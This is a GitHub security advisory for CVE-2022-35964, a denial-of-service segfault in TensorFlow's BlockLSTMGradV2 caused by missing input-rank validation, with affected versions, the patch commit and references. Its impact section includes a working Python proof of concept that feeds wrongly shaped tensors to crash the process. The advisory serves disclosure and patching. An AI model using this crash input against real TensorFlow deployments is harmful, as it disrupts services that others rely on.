# [M] TensorFlow vulnerable to segfault in `BlockLSTMGradV2`

## Summary
Severity: Medium
Advisory: GHSA-f7r5-q7cx-h668
CVE: CVE-2022-35964
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-f7r5-q7cx-h668
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
The implementation of `BlockLSTMGradV2` does not fully validate its inputs.
 - `wci`, `wcf`, `wco`, `b` must be rank 1
 - `w`, cs_prev`, `h_prev` must be rank 2
 - `x` must be rank 3
This results in a a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

use_peephole = False
seq_len_max = tf.constant(1, shape=[], dtype=tf.int64)
x = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
w = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
b = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
i = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
f = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
o = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
ci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
co = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
cs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
tf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)
```

### Patches
We have patched the issue in GitHub commit [2a458fc4866505be27c62f81474ecb2b870498fa](https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668
- https://nvd.nist.gov/vuln/detail/CVE-2022-35964
- https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
